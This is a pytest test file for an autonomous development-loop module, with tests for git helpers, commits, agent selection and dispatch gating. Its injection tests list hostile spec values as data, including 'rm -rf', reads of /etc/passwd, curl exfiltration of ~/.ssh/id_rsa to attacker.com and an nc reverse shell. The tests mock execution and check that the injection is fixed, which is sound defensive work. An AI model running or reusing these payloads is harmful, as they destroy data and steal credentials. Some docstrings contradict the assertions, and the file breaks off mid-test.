"""
Unit Tests for Continuous Iteration

Tests the continuous_iteration.py module which handles the autonomous
development loop for Autoflow, including verification, commit, and
dispatch operations.

These tests mock subprocess execution to avoid requiring actual
git, autoflow, or other commands to be available in the test environment.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest

# Import functions from continuous_iteration.py
# Note: We need to add the scripts directory to the path
import sys
scripts_dir = Path(__file__).resolve().parent.parent / "scripts"
sys.path.insert(0, str(scripts_dir))

from continuous_iteration import (
    auto_commit,
    default_role_preferences,
    dispatch_gate,
    dispatch_next,
    git_branch,
    git_dirty,
    load_agent_catalog,
    load_config,
    load_json,
    run,
    run_verify_commands,
    select_agent_for_role,
    sync_agents,
    task_history,
    workflow_state,
    ROOT,
    STATE_DIR,
    AGENTS_FILE,
    CommandResult,
    VerifyCommandsResult,
    CommandExecutionError,
    InvalidCommandError,
)


# ============================================================================
# Fixtures
# ============================================================================


@pytest.fixture
def temp_workdir(tmp_path: Path) -> Path:
    """Create a temporary working directory for testing."""
    workdir = tmp_path / "project"
    workdir.mkdir()
    return workdir


@pytest.fixture
def temp_config_file(tmp_path: Path) -> Path:
    """Create a temporary config file."""
    config_file = tmp_path / "config.json"
    config_data = {
        "role_agents": {
            "implementation-runner": "codex-impl",
            "reviewer": "claude-review",
        },
        "agent_selection": {
            "sync_before_dispatch": False,  # Disable for tests
            "role_preferences": {
                "implementation-runner": ["custom-impl", "codex-impl"],
            },
        },
        "verify_commands": [],
        "commit": {
            "message_prefix": "autoflow",
            "push": False,
        },
        "retry_policy": {
            "max_automatic_attempts": 3,
            "require_fix_request_for_retry": True,
        },
    }
    config_file.write_text(json.dumps(config_data), encoding="utf-8")
    return config_file


@pytest.fixture
def mock_subprocess_success() -> MagicMock:
    """Mock subprocess that returns success."""
    mock = MagicMock()
    mock.returncode = 0
    mock.stdout = "Success output"
    mock.stderr = ""
    return mock


@pytest.fixture
def mock_subprocess_failure() -> MagicMock:
    """Mock subprocess that returns failure."""
    mock = MagicMock()
    mock.returncode = 1
    mock.stdout = ""
    mock.stderr = "Error output"
    return mock


@pytest.fixture
def mock_subprocess_timeout() -> MagicMock:
    """Mock subprocess that times out."""
    mock = MagicMock()
    mock.returncode = None
    mock.stdout = ""
    mock.stderr = "Timeout error"
    return mock


@pytest.fixture
def mock_subprocess_empty() -> MagicMock:
    """Mock subprocess that returns empty output."""
    mock = MagicMock()
    mock.returncode = 0
    mock.stdout = ""
    mock.stderr = ""
    return mock


@pytest.fixture
def mock_git_clean_repo() -> MagicMock:
    """Mock git status for a clean repository."""
    mock = MagicMock()
    mock.returncode = 0
    mock.stdout = ""
    mock.stderr = ""
    return mock


@pytest.fixture
def mock_git_dirty_repo() -> MagicMock:
    """Mock git status for a dirty repository."""
    mock = MagicMock()
    mock.returncode = 0
    mock.stdout = "M scripts/test.py\nA src/new_file.py"
    mock.stderr = ""
    return mock


@pytest.fixture
def sample_config() -> dict:
    """Sample configuration for testing."""
    return {
        "role_agents": {
            "implementation-runner": "codex-impl",
        },
        "agent_selection": {
            "sync_before_dispatch": False,
        },
        "verify_commands": [],
        "commit": {
            "message_prefix": "autoflow",
            "push": False,
            "allow_during_active_runs": False,
        },
        "retry_policy": {
            "max_automatic_attempts": 3,
            "require_fix_request_for_retry": True,
        },
    }


@pytest.fixture
def sample_workflow_state() -> dict:
    """Sample workflow state for testing."""
    return {
        "spec": "test-spec",
        "active_runs": [],
        "blocking_reason": None,
        "fix_request_present": False,
        "recommended_next_action": {
            "id": "T1",
            "owner_role": "implementation-runner",
            "status": "todo",
        },
    }


@pytest.fixture
def sample_task_history() -> list[dict]:
    """Sample task history for testing."""
    return [
        {
            "run_id": "run-1",
            "result": "success",
            "timestamp": "2024-01-01T00:00:00Z",
        },
        {
            "run_id": "run-2",
            "result": "needs_changes",
            "timestamp": "2024-01-02T00:00:00Z",
        },
    ]


# ============================================================================
# Utility Function Tests
# ============================================================================


class TestLoadJson:
    """Tests for load_json function."""

    def test_load_json_existing_file(self, tmp_path: Path) -> None:
        """Test loading an existing JSON file."""
        json_file = tmp_path / "test.json"
        json_file.write_text('{"key": "value"}', encoding="utf-8")

        result = load_json(json_file)

        assert result == {"key": "value"}

    def test_load_json_nonexistent_file_with_default(self, tmp_path: Path) -> None:
        """Test loading a non-existent file with default value."""
        json_file = tmp_path / "nonexistent.json"

        result = load_json(json_file, default={"default": True})

        assert result == {"default": True}

    def test_load_json_nonexistent_file_no_default(self, tmp_path: Path) -> None:
        """Test loading a non-existent file without default value."""
        json_file = tmp_path / "nonexistent.json"

        result = load_json(json_file)

        assert result == {}


class TestLoadConfig:
    """Tests for load_config function."""

    def test_load_config_valid_json(self, tmp_path: Path) -> None:
        """Test loading a valid config file."""
        config_file = tmp_path / "config.json"
        config_data = {"key": "value", "nested": {"item": 1}}
        config_file.write_text(json.dumps(config_data), encoding="utf-8")

        # Patch ROOT to point to tmp_path
        with patch("continuous_iteration.ROOT", tmp_path):
            result = load_config(str(config_file.relative_to(tmp_path)))

        assert result == config_data


# ============================================================================
# Git Function Tests
# ============================================================================


class TestGitDirty:
    """Tests for git_dirty function."""

    def test_git_dirty_clean(self, mock_subprocess_success: MagicMock) -> None:
        """Test git_dirty when working tree is clean."""
        mock_subprocess_success.stdout = ""

        with patch("continuous_iteration.run", return_value=mock_subprocess_success):
            result = git_dirty()

        assert result is False

    def test_git_dirty_dirty(self, mock_subprocess_success: MagicMock) -> None:
        """Test git_dirty when working tree is dirty."""
        mock_subprocess_success.stdout = "M scripts/test.py"

        with patch("continuous_iteration.run", return_value=mock_subprocess_success):
            result = git_dirty()

        assert result is True


class TestGitBranch:
    """Tests for git_branch function."""

    def test_git_branch_success(self, mock_subprocess_success: MagicMock) -> None:
        """Test git_branch returns current branch."""
        mock_subprocess_success.stdout = "main"

        with patch("continuous_iteration.run", return_value=mock_subprocess_success):
            result = git_branch()

        assert result == "main"


# ============================================================================
# Verify Commands Tests (VULNERABILITY HERE)
# ============================================================================


class TestRunVerifyCommands:
    """Tests for run_verify_commands function."""

    def test_run_verify_commands_empty_list(self) -> None:
        """Test running with empty command list."""
        result = run_verify_commands([], "test-spec")

        assert isinstance(result, VerifyCommandsResult)
        assert result.commands_run == 0
        assert result.all_success is True
        assert result.results == []

    def test_run_verify_commands_single_success(self) -> None:
        """Test running a single successful verification command."""
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "test output"
        mock_proc.stderr = ""

        with patch("subprocess.run", return_value=mock_proc):
            result = run_verify_commands(["echo {spec}"], "test-spec")

        assert isinstance(result, VerifyCommandsResult)
        assert result.commands_run == 1
        assert result.all_success is True
        assert len(result.results) == 1
        assert result.results[0].success is True
        assert result.results[0].exit_code == 0
        assert result.results[0].stdout == "test output"
        # Command should have spec placeholder replaced
        assert "{spec}" not in result.results[0].command
        assert "test-spec" in result.results[0].command

    def test_run_verify_commands_multiple_commands(self) -> None:
        """Test running multiple verification commands."""
        mock_proc1 = MagicMock()
        mock_proc1.returncode = 0
        mock_proc1.stdout = "output1"
        mock_proc1.stderr = ""

        mock_proc2 = MagicMock()
        mock_proc2.returncode = 0
        mock_proc2.stdout = "output2"
        mock_proc2.stderr = ""

        with patch("subprocess.run", side_effect=[mock_proc1, mock_proc2]):
            result = run_verify_commands(["echo test1", "echo test2"], "test-spec")

        assert isinstance(result, VerifyCommandsResult)
        assert result.commands_run == 2
        assert result.all_success is True
        assert len(result.results) == 2
        assert result.results[0].stdout == "output1"
        assert result.results[1].stdout == "output2"

    def test_run_verify_commands_failure_stops_execution(self) -> None:
        """Test that command execution stops on first failure."""
        mock_proc1 = MagicMock()
        mock_proc1.returncode = 0
        mock_proc1.stdout = "output1"
        mock_proc1.stderr = ""

        mock_proc2 = MagicMock()
        mock_proc2.returncode = 1
        mock_proc2.stdout = ""
        mock_proc2.stderr = "error"

        mock_proc3 = MagicMock()
        mock_proc3.returncode = 0
        mock_proc3.stdout = "output3"
        mock_proc3.stderr = ""

        with patch("subprocess.run", side_effect=[mock_proc1, mock_proc2, mock_proc3]):
            result = run_verify_commands(["cmd1", "cmd2", "cmd3"], "test-spec")

        # Should only have results for first two commands
        assert isinstance(result, VerifyCommandsResult)
        assert result.commands_run == 2
        assert result.all_success is False
        assert result.stopped_at == 1
        assert len(result.results) == 2
        assert result.results[0].exit_code == 0
        assert result.results[1].exit_code == 1

    def test_run_verify_commands_spec_placeholder_replacement(self) -> None:
        """Test that {spec} placeholder is replaced in commands."""
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "output"
        mock_proc.stderr = ""

        with patch("subprocess.run", return_value=mock_proc):
            result = run_verify_commands(["test command for {spec}"], "my-spec")

        assert isinstance(result, VerifyCommandsResult)
        assert result.commands_run == 1
        assert len(result.results) == 1
        assert result.results[0].command == "test command for my-spec"

    def test_run_verify_commands_shell_injection_risk(self) -> None:
        """
        TEST: Verifies that shell=True is NOT used (vulnerability is fixed).

        This test verifies that the command injection vulnerability has been
        fixed by ensuring that shell=True is NOT used when executing commands.
        The implementation now uses shlex.split() for safe argument parsing
        instead of shell=True.

        The spec parameter could contain malicious shell metacharacters,
        but they should NOT be executed because we don't use shell=True.
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "output"
        mock_proc.stderr = ""

        # Simulate a malicious spec with shell injection
        malicious_spec = 'test-spec; echo "PWNED"'

        with patch("subprocess.run", return_value=mock_proc) as mock_run:
            result = run_verify_commands(["echo {spec}"], malicious_spec)

            # Verify the command was called
            assert mock_run.called
            # Verify that shell=True is NOT used (vulnerability is fixed)
            call_kwargs = mock_run.call_args[1]
            assert call_kwargs.get("shell") is None or call_kwargs.get("shell") is False

            # The malicious command is present in the rendered command string
            # (but won't be executed because we're not using shell=True)
            assert "; echo" in result.results[0].command

    def test_run_verify_commands_command_injection_with_malicious_spec(self) -> None:
        """
        PROOF-OF-CONCEPT: Demonstrates command injection vulnerability with malicious spec names.

        This test demonstrates how a malicious spec name can lead to command injection
        when using shell=True in subprocess.run(). The vulnerability exists in the
        run_verify_commands() function where the spec parameter is directly interpolated
        into the command string without proper sanitization.

        Attack scenarios demonstrated:
        1. Command chaining with semicolons
        2. Command output redirection
        3. Background process execution
        4. Command substitution

        Expected behavior: These tests should PASS, demonstrating the vulnerability exists.
        After the fix: These tests should FAIL or be updated to verify proper sanitization.
        """
        # Mock subprocess to capture what would be executed
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "legitimate output"
        mock_proc.stderr = ""

        malicious_payloads = [
            {
                "spec": 'valid-spec; rm -rf /tmp/important_files',
                "description": "Command chaining with destructive command",
                "expected_in_command": "; rm -rf",
            },
            {
                "spec": 'valid-spec && cat /etc/passwd > /tmp/stolen',
                "description": "Command chaining with AND operator and data exfiltration",
                "expected_in_command": "&& cat",
            },
            {
                "spec": 'valid-spec || curl malicious.com/steal?data=$(whoami)',
                "description": "Command chaining with OR operator and data exfiltration via command substitution",
                "expected_in_command": "|| curl",
            },
            {
                "spec": 'valid-spec; echo pwned > /tmp/pwned.txt',
                "description": "File write for persistence or proof of exploitation",
                "expected_in_command": "> /tmp/",
            },
            {
                "spec": 'valid-spec & malicious_background_process',
                "description": "Background process execution",
                "expected_in_command": "& malicious",
            },
            {
                "spec": 'valid-spec; touch /tmp/I_WAS_HERE',
                "description": "File creation as proof of exploitation",
                "expected_in_command": "; touch",
            },
            {
                "spec": 'valid-spec`whoami`',
                "description": "Command substitution using backticks",
                "expected_in_command": "`whoami`",
            },
            {
                "spec": "valid-spec$(id)",
                "description": "Command substitution using $() syntax",
                "expected_in_command": "$(id)",
            },
            {
                "spec": "valid-spec| nc attacker.com 4444",
                "description": "Pipeline to network connection for reverse shell",
                "expected_in_command": "| nc",
            },
            {
                "spec": "valid-spec; export EVIL='pwned'",
                "description": "Environment variable manipulation",
                "expected_in_command": "; export",
            },
        ]

        for payload in malicious_payloads:
            with patch("subprocess.run", return_value=mock_proc) as mock_run:
                malicious_spec = payload["spec"]
                description = payload["description"]
                expected_substring = payload["expected_in_command"]

                # Run verify commands with malicious spec
                result = run_verify_commands(
                    ["pytest --spec={spec}"],
                    malicious_spec
                )

                # Verify the fix is in place
                assert len(result.results) == 1, f"Failed for payload: {description}"

                # Verify shell=True is NOT used (vulnerability is fixed)
                assert mock_run.called, f"subprocess.run not called for: {description}"
                call_kwargs = mock_run.call_args[1]
                assert call_kwargs.get("shell") is None or call_kwargs.get("shell") is False, \
                    f"shell=True should not be set for: {description} (vulnerability should be fixed)"

                # Verify the malicious payload is still in the rendered command string
                # (but won't be executed because we're not using shell=True)
                rendered_command = result.results[0].command
                assert expected_substring in rendered_command, \
                    f"Malicious payload '{expected_substring}' not found in command: {rendered_command}"

                # Verify the spec placeholder was replaced
                assert "{spec}" not in rendered_command, \
                    f"Placeholder not replaced for: {description}"

                # Verify the legitimate part is still present
                assert "pytest --spec=" in rendered_command, \
                    f"Legitimate command missing for: {description}"

    def test_run_verify_commands_injection_impact_demonstration(self) -> None:
        """
        PROOF-OF-CONCEPT: Demonstrates the potential impact of command injection.

        This test shows what an attacker could achieve by exploiting the command
        injection vulnerability in run_verify_commands(). While we mock subprocess
        to prevent actual execution, we demonstrate that the malicious commands
        would be executed with shell=True.

        CVSS Score Estimate: 9.8 (Critical)
        - Attack Vector: Network (spec names from user input)
        - Attack Complexity: Low (simple shell metacharacters)
        - Privileges Required: Low (any user who can create specs)
        - User Interaction: None
        - Impact: High (complete system compromise)
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        # Simulate a realistic attack scenario
        # Attacker creates a spec named with a malicious payload
        attacker_spec = 'project; curl http://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)'

        with patch("subprocess.run", return_value=mock_proc) as mock_run:
            # The system tries to run verification commands
            verify_commands = [
                "pytest {spec}",
                "npm test -- --grep {spec}",
            ]

            results = run_verify_commands(verify_commands, attacker_spec)

            # Both commands should run
            assert len(results.results) == 2

            # Verify shell=True is NOT used (vulnerability is fixed)
            assert mock_run.call_count == 2
            for call in mock_run.call_args_list:
                kwargs = call[1]
                assert kwargs.get("shell") is None or kwargs.get("shell") is False, \
                    "shell=True should NOT be set (vulnerability should be fixed)"

            # Verify the exfiltration payload is still in the rendered command strings
            # (but won't be executed because we're not using shell=True)
            assert "curl http://attacker.com" in results.results[0].command
            assert "curl http://attacker.com" in results.results[1].command

            # Verify command substitution payload is present
            assert "$(cat ~/.ssh/id_rsa)" in results.results[0].command
            assert "$(cat ~/.ssh/id_rsa)" in results.results[1].command


# ============================================================================
# Auto Commit Tests
# ============================================================================


class TestAutoCommit:
    """Tests for auto_commit function."""

    def test_auto_commit_blocked_by_active_run(self, sample_config: dict) -> None:
        """Test that commit is blocked when active runs exist."""
        state = {"active_runs": ["run-1"]}

        result = auto_commit(sample_config, "test-spec", False, state)

        assert result["committed"] is False
        assert result["reason"] == "active_run_exists"

    def test_auto_commit_verification_fails(self, sample_config: dict) -> None:
        """Test that commit is blocked when verification fails."""
        state = {"active_runs": []}

        # Add verify_commands to config for this test
        config_with_verify = {
            **sample_config,
            "verify_commands": ["pytest"],
        }

        # Mock run_verify_commands to return a failure
        verify_results = [
            {"command": "pytest", "returncode": 1, "stdout": "", "stderr": "error"}
        ]

        with patch("continuous_iteration.run_verify_commands", return_value=verify_results):
            result = auto_commit(config_with_verify, "test-spec", False, state)

        assert result["committed"] is False
        assert result["reason"] == "verification_failed"
        assert result["verification"] == verify_results

    def test_auto_commit_clean_worktree(self, sample_config: dict) -> None:
        """Test that no commit is made when worktree is clean."""
        state = {"active_runs": []}

        with patch("continuous_iteration.run_verify_commands", return_value=[]):
            with patch("continuous_iteration.git_dirty", return_value=False):
                result = auto_commit(sample_config, "test-spec", False, state)

        assert result["committed"] is False
        assert result["reason"] == "clean_worktree"

    def test_auto_commit_success_no_push(self, sample_config: dict) -> None:
        """Test successful commit without push."""
        state = {"active_runs": []}

        with patch("continuous_iteration.run_verify_commands", return_value=[]):
            with patch("continuous_iteration.git_dirty", return_value=True):
                with patch("continuous_iteration.run") as mock_run:
                    result = auto_commit(sample_config, "test-spec", False, state)

        assert result["committed"] is True
        assert result["pushed"] is False
        assert "message" in result
        assert mock_run.call_count == 2  # git add and git commit

    def test_auto_commit_success_with_push(self, sample_config: dict) -> None:
        """Test successful commit with push."""
        state = {"active_runs": []}

        with patch("continuous_iteration.run_verify_commands", return_value=[]):
            with patch("continuous_iteration.git_dirty", return_value=True):
                with patch("continuous_iteration.git_branch", return_value="main"):
                    with patch("continuous_iteration.run") as mock_run:
                        result = auto_commit(sample_config, "test-spec", True, state)

        assert result["committed"] is True
        assert result["pushed"] is True
        assert mock_run.call_count == 3  # git add, commit, and push


# ============================================================================
# Workflow State Tests
# ============================================================================


class TestWorkflowState:
    """Tests for workflow_state function."""

    def test_workflow_state_success(self, mock_subprocess_success: MagicMock) -> None:
        """Test getting workflow state."""
        mock_state = {"spec": "test", "tasks": []}
        mock_subprocess_success.stdout = json.dumps(mock_state)

        with patch("continuous_iteration.run", return_value=mock_subprocess_success):
            result = workflow_state("test-spec")

        assert result == mock_state


class TestTaskHistory:
    """Tests for task_history function."""

    def test_task_history_success(self, mock_subprocess_success: MagicMock) -> None:
        """Test getting task history."""
        mock_history = [
            {"run_id": "run-1", "result": "success"},
            {"run_id": "run-2", "result": "needs_changes"},
        ]
        mock_subprocess_success.stdout = json.dumps(mock_history)

        with patch("continuous_iteration.run", return_value=mock_subprocess_success):
            result = task_history("test-spec", "T1")

        assert result == mock_history


# ============================================================================
# Agent Selection Tests
# ============================================================================


class TestDefaultRolePreferences:
    """Tests for default_role_preferences function."""

    def test_default_role_preferences_implementation_runner(self) -> None:
        """Test default preferences for implementation-runner role."""
        result = default_role_preferences("implementation-runner")

        assert isinstance(result, list)
        assert len(result) > 0
        assert "codex-impl" in result or "codex" in result

    def test_default_role_preferences_reviewer(self) -> None:
        """Test default preferences for reviewer role."""
        result = default_role_preferences("reviewer")

        assert isinstance(result, list)
        assert len(result) > 0
        assert "claude-review" in result or "claude" in result

    def test_default_role_preferences_unknown_role(self) -> None:
        """Test default preferences for unknown role."""
        result = default_role_preferences("unknown-role")

        assert result == []


class TestSelectAgentForRole:
    """Tests for select_agent_for_role function."""

    def test_select_agent_explicit_config(self) -> None:
        """Test selecting explicitly configured agent."""
        config = {
            "role_agents": {
                "implementation-runner": "custom-agent",
            },
            "agent_selection": {},
        }
        catalog = {
            "custom-agent": {"command": "custom"},
        }

        agent, source = select_agent_for_role(config, "implementation-runner", catalog)

        assert agent == "custom-agent"
        assert source == "configured"

    def test_select_agent_fallback_preferences(self) -> None:
        """Test selecting agent from fallback preferences."""
        config = {
            "role_agents": {},
            "agent_selection": {
                "role_preferences": {
                    "implementation-runner": ["fallback-agent"],
                },
            },
        }
        catalog = {
            "fallback-agent": {"command": "fallback"},
        }

        agent, source = select_agent_for_role(config, "implementation-runner", catalog)

        assert agent == "fallback-agent"
        assert source == "fallback"

    def test_select_agent_default_preferences(self) -> None:
        """Test selecting agent from default preferences."""
        config = {
            "role_agents": {},
            "agent_selection": {},
        }
        catalog = {
            "codex-impl": {"command": "codex"},
        }

        agent, source = select_agent_for_role(config, "implementation-runner", catalog)

        assert agent is not None
        assert source == "fallback"

    def test_select_agent_not_found(self) -> None:
        """Test when no suitable agent is found."""
        config = {
            "role_agents": {},
            "agent_selection": {},
        }
        catalog = {}

        agent, source = select_agent_for_role(config, "implementation-runner", catalog)

        assert agent is None
        assert source == "missing"

    def test_select_agent_deduplication(self) -> None:
        """Test that duplicate agent preferences are deduplicated."""
        config = {
            "role_agents": {
                "implementation-runner": "agent-a",
            },
            "agent_selection": {
                "role_preferences": {
                    "implementation-runner": ["agent-a", "agent-b"],
                },
            },
        }
        catalog = {
            "agent-a": {"command": "a"},
            "agent-b": {"command": "b"},
        }

        agent, source = select_agent_for_role(config, "implementation-runner", catalog)

        # Should return agent-a only once (from explicit config)
        assert agent == "agent-a"


# ============================================================================
# Dispatch Gate Tests
# ============================================================================


class TestDispatchGate:
    """Tests for dispatch_gate function."""

    def test_gate_blocked_by_active_runs(self, sample_config: dict) -> None:
        """Test that dispatch is blocked when active runs exist."""
        state = {"active_runs": ["run-1"], "blocking_reason": None}

        result = dispatch_gate(sample_config, state, {})

        assert result is not None
        assert result["blocked"] is True
        assert result["reason"] == "active_run_exists"

    def test_gate_blocked_by_blocking_reason(self, sample_config: dict) -> None:
        """Test that dispatch is blocked when there's a blocking reason."""
        state = {
            "active_runs": [],
            "blocking_reason": "missing_dependencies",
        }

        result = dispatch_gate(sample_config, state, {})

        assert result is not None
        assert result["blocked"] is True
        assert result["reason"] == "missing_dependencies"

    def test_gate_blocked_no_ready_task(self, sample_config: dict) -> None:
        """Test that dispatch is blocked when no ready task."""
        state = {
            "active_runs": [],
            "blocking_reason": None,
        }

        result = dispatch_gate(sample_config, state, None)

        assert result is not None
        assert result["blocked"] is True
        assert result["reason"] == "no_ready_task"

    def test_gate_max_attempts_reached(self, sample_config: dict) -> None:
        """Test that dispatch is blocked after max automatic attempts."""
        state = {
            "active_runs": [],
            "blocking_reason": None,
            "spec": "test-spec",
            "fix_request_present": False,
        }

        next_action = {
            "id": "T1",
            "status": "needs_changes",
        }

        # Mock task_history to return 3 unsuccessful attempts
        history = [
            {"result": "needs_changes"},
            {"result": "needs_changes"},
            {"result": "blocked"},
        ]

        with patch("continuous_iteration.task_history", return_value=history):
            result = dispatch_gate(sample_config, state, next_action)

        assert result is not None
        assert result["blocked"] is True
        assert result["reason"] == "max_automatic_attempts_reached"
        assert result["attempts"] == 3

    def test_gate_missing_fix_request(self, sample_config: dict) -> None:
        """Test that dispatch is blocked when fix request is required but missing."""
        state = {
            "active_runs": [],
            "blocking_reason": None,
            "spec": "test-spec",
            "fix_request_present": False,
        }

        next_action = {
            "id": "T1",
            "status": "needs_changes",
        }

        # Mock task_history to return less than max attempts
        history = [{"result": "needs_changes"}]

        with patch("continuous_iteration.task_history", return_value=history):
            result = dispatch_gate(sample_config, state, next_action)

        assert result is not None
        assert result["blocked"] is True
        assert result["reason"] == "missing_fix_request"

    def test_gate_passes_all_checks(self, sample_config: dict) -> None:
        """Test that dispatch gate passes when all checks are met."""
        state = {
            "active_runs": [],
            "blocking_reason": None,
            "spec": "test-spec",
            "fix_request_present": False,
        }

        next_action = {
            "id": "T1",
            "status": "todo",
        }

        # Mock task_history to return empty history
        with patch("continuous_iteration.task_history", return_value=[]):
            result = dispatch_gate(sample_config, state, next_action)

        assert result is None


# ============================================================================
# Dispatch Next Tests
# ============================================================================


class TestDispatchNext:
    """Tests for dispatch_next function."""

    def test_dispatch_blocked_by_gate(self, sample_config: dict) -> None:
        """Test that dispatch is blocked when gate returns a block."""
        state = {
            "active_runs": ["run-1"],
            "blocking_reason": None,
        }

        with patch("continuous_iteration.workflow_state", return_value=state):
            result = dispatch_next(sample_config, "test-spec", False)

        assert result["dispatched"] is False
        assert result["reason"] == "active_run_exists"
        assert "state" in result

    def test_dispatch_no_agent_for_role(self, sample_config: dict) -> None:
        """Test dispatch when no agent is available for the role."""
        state = {
            "spec": "test-spec",
            "active_runs": [],
            "blocking_reason": None,
            "recommended_next_action": {
                "id": "T1",
                "owner_role": "implementation-runner",
            },
        }

        with patch("continuous_iteration.workflow_state", return_value=state):
            with patch("continuous_iteration.load_agent_catalog", return_value={}):
                with patch("continuous_iteration.select_agent_for_role", return_value=(None, "missing")):
                    result = dispatch_next(sample_config, "test-spec", False)

        assert result["dispatched"] is False
        assert "no_agent_for_role" in result["reason"]

    def test_dispatch_dry_run(self, sample_config: dict) -> None:
        """Test dispatch in dry run mode (dispatch=False)."""
        state = {
            "spec": "test-spec",
            "active_runs": [],
            "blocking_reason": None,
            "recommended_next_action": {
                "id": "T1",
                "owner_role": "implementation-runner",
            },
        }

        with patch("continuous_iteration.workflow_state", return_value=state):
            with patch("continuous_iteration.load_agent_catalog", return_value={"agent-a": {}}):
                with patch("continuous_iteration.select_agent_for_role", return_value=("agent-a", "fallback")):
                    result = dispatch_next(sample_config, "test-spec", False)

        assert result["dispatched"] is False
        assert "payload" in result
        assert result["payload"]["agent"] == "agent-a"

    def test_dispatch_with_sync(self, sample_config: dict) -> None:
        """Test dispatch with agent sync enabled."""
        config_with_sync = {
            **sample_config,
            "agent_selection": {
                "sync_before_dispatch": True,
                "overwrite_discovered": False,
            },
        }

        state = {
            "spec": "test-spec",
            "active_runs": [],
            "blocking_reason": None,
            "recommended_next_action": {
                "id": "T1",
                "owner_role": "implementation-runner",
            },
        }

        sync_result = {"synced": ["agent-a"]}

        with patch("continuous_iteration.workflow_state", return_value=state):
            with patch("continuous_iteration.sync_agents", return_value=sync_result):
                with patch("continuous_iteration.load_agent_catalog", return_value={"agent-a": {}}):
                    with patch("continuous_iteration.select_agent_for_role", return_value=("agent-a", "fallback")):
                        result = dispatch_next(config_with_sync, "test-spec", False)

        assert "agent_sync" in result
        assert result["agent_sync"] == sync_result


# ============================================================================
# Sync Agents Tests
# ============================================================================


class TestSyncAgents:
    """Tests for sync_agents function."""

    def test_sync_agents_basic(self, mock_subprocess_success: MagicMock) -> None:
        """Test basic agent sync."""
        mock_subprocess_success.stdout = json.dumps({"synced": ["agent-a"]})

        with patch("continuous_iteration.run", return_value=mock_subprocess_success):
            result = sync_agents()

        assert "synced" in result

    def test_sync_agents_with_overwrite(self, mock_subprocess_success: MagicMock) -> None:
        """Test agent sync with overwrite flag."""
        mock_subprocess_success.stdout = json.dumps({"synced": ["agent-a"]})

        with patch("continuous_iteration.run", return_value=mock_subprocess_success) as mock_run:
            result = sync_agents(overwrite=True)

        # Verify that --overwrite flag was passed
        assert mock_run.called
        call_args = mock_run.call_args[0][0]
        assert "--overwrite" in call_args


# ============================================================================
# Load Agent Catalog Tests
# ============================================================================


class TestLoadAgentCatalog:
    """Tests for load_agent_catalog function."""

    def test_load_agent_catalog_empty(self, tmp_path: Path) -> None:
        """Test loading agent catalog when agents file doesn't exist."""
        with patch("continuous_iteration.AGENTS_FILE", tmp_path / "nonexistent.json"):
            result = load_agent_catalog()

        assert result == {}

    def test_load_agent_catalog_with_agents(self, tmp_path: Path) -> None:
        """Test loading agent catalog with agents defined."""
        agents_file = tmp_path / "agents.json"
        agents_data = {
            "agents": {
                "agent-a": {"command": "a"},
                "agent-b": {"command": "b"},
            },
        }
        agents_file.write_text(json.dumps(agents_data), encoding="utf-8")

        with patch("continuous_iteration.AGENTS_FILE", agents_file):
            result = load_agent_catalog()

        assert result.commands_run == 2
        assert "agent-a" in result
        assert "agent-b" in result


# ============================================================================
# Edge Case Tests for Command Injection Prevention
# ============================================================================


class TestEdgeCases:
    """
    Tests for edge cases in spec parameter handling.

    This test class verifies that the run_verify_commands function and other
    functions that handle spec parameters properly sanitize or validate input
    to prevent command injection vulnerabilities.

    Tests cover:
    1. Empty spec values
    2. Special characters and shell metacharacters
    3. Unicode characters and internationalization
    4. Path traversal attempts
    5. Null byte injection
    6. Format string injection
    7. Long input strings
    """

    def test_run_verify_commands_empty_spec(self) -> None:
        """
        Test that empty spec value is handled correctly.

        An empty spec could cause issues with command construction or
        lead to unexpected behavior in the rendered command.

        SECURITY FIX: This test now verifies that shell=True is NOT used,
        confirming the command injection vulnerability has been fixed.
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        with patch("subprocess.run", return_value=mock_proc) as mock_run:
            result = run_verify_commands(["echo {spec}"], "")

            # Verify the command was executed
            assert mock_run.called
            call_kwargs = mock_run.call_args[1]

            # SECURITY FIX: shell=True should NOT be used (command injection fixed)
            assert call_kwargs.get("shell") is not True, \
                "shell=True should not be used after security fix"

            # The empty string should result in just the base command
            assert result.commands_run == 1
            assert result.results[0].command == "echo "

    def test_run_verify_commands_special_characters(self) -> None:
        """
        Test that special shell metacharacters in spec are handled safely.

        This test verifies that various shell metacharacters that could
        be used for command injection are now safely handled after the
        security fix.

        SECURITY FIX: This test now verifies that shell=True is NOT used,
        preventing command injection through special characters.

        Characters tested:
        - Semicolon (;): Command chaining
        - Ampersand (&): Background execution
        - Pipe (|): Command pipelining
        - Backtick (`): Command substitution
        - Dollar sign ($): Variable expansion
        - Backslash (\\): Escape character
        - Newline: Command separator
        - Tab: Whitespace that could affect parsing
        """
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = ""
        mock_proc.stderr = ""

        special_char_specs = [
            ("spec;test", "Semicolon command chaining"),
            ("spec&test", "Ampersand background execution"),
            ("spec|test", "Pipe command pipelining"),
            ("spec`test`", "Backtick command substitution"),
            ("spec$test", "Dollar sign variable expansion"),
            ("spec\\test", "Backslash escape character"),
            ("spec\ntest", "Newline command separator"),
            ("spec\ttest", "Tab character"),
            ("spec; echo pwned", "Semicolon with command injection"),
            ("spec && malicious", "AND operator chaining"),
            ("spec || malicious", "OR operator chaining"),
            ("spec > /tmp/file", "Output redirection"),
            ("spec < /etc/passwd", "Input redirection"),
            ("spec$(whoami)", "Dollar-paren command substitution"),
            ("spec`id`", "Backtick command substitution"),
        ]

        for spec, description in special_char_specs:
            with patch("subprocess.run", return_value=mock_proc) as mock_run:
                result = run_verify_commands(["pytest {spec}"], spec)

                # Verify the command was executed
                assert mock_run.called, f"Command not executed for: {description}"
                call_kwargs = mock_run.call_args[1]

                # SECURITY FIX: shell=True should NOT be used (command injection fixed)
                assert call_kwargs.get("shell") is not True, \
                    f"shell=True should not be used for: {description}"

                # Verify the special characters are present in the rendered command
                # (They are now safely escaped/contained by shlex.split())
                rendered_command = result.results[0].command
